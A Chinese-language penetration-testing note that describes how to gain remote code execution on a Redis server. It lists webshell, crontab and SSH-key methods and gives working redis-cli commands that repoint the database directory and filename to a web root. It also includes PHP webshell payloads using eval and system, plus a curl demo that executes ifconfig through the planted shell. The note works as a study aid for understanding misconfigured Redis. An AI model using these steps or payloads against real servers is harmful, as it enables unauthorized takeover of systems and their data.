### redis的RCE

三种方式：
- 写webshell（需要知道web绝对路径、web路径redis用户有权限写）
- 写入到crontab
- 将攻击者的公钥写入到authorized_key，使用攻击者的私钥ssh登录（需要开启ssh服务）


#### 说明
```
dir: 工作目录
dbfilename: 数据库的文件名
```

### redis写shell原理

设置dir工作目录，然后设置dbfilename，通过这两个步骤设置了数据库的绝对路径和文件名。后续写入的键值对就写入到这个可控的文件中（初衷是数据库文件），这里变成了攻击者的shell文件。

在redis-cli下查看这两个值：
```
127.0.0.1:6379> config get dir
1) "dir"
2) "/var/lib/redis"
127.0.0.1:6379> config get dbfilename
1) "dbfilename"
2) "dump.rdb"
```
然后在系统上查看这个目录和文件的权限。redis用户对这个文件具有读写权限。这个目录也是只有redis这个用户才能访问。

```
root@ubuntu:/proc# ll /var/lib/redis
total 188
drwxr-x---  2 redis redis  4096 Jan 10 22:25 ./
drwxr-xr-x 73 root  root   4096 Nov  5 22:35 ../
-rw-rw----  1 redis redis 58587 Jan 10 22:25 dump.rdb
-rw-rw----  1 redis redis 58587 Dec  9 18:46 temp-33935.rdb
-rw-rw----  1 redis redis 58587 Dec 27 17:58 temp-67951.rdb
```


### redis启动的权限问题
如果想通过redis写入webshell，而redis是以redis用户启动，apache2是以www-data用户启动，则redis用户无法写入/var/www/目录的文件。在save步骤会出错。
```
127.0.0.1:6379> set 1 "<?php @eval($_POST['cqq']);?>    "
OK
127.0.0.1:6379> save
(error) ERR
```

### redis写webshell步骤
```
127.0.0.1:6379> config set dir /var/www
OK
127.0.0.1:6379> config set dbfilename redis_shell4.php
OK
127.0.0.1:6379> set 1111 "    <?php system($_REQUEST['cqq']);?>   "
OK
127.0.0.1:6379> save
```

#### Demo
```
$ curl -i http://192.168.85.129/redis_shell4.php?cqq=ifconfig --output -
HTTP/1.1 200 OK
Date: Mon, 11 Jan 2021 08:00:12 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2538
Content-Type: text/html; charset=UTF-8

REDIS0008	redis-ver4.0.9
redis-bits󿿀򳨭eused-memÐ
                      Ϻ
                       aof-preamble~򀕄(    br-3f4328a91e7c: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
        ether 02:42:91:42:81:60  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```


### 参考
- [利用redis写webshell](https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html)
- [redis 在渗透中 getshell 方法总结](https://zhuanlan.zhihu.com/p/36529010)
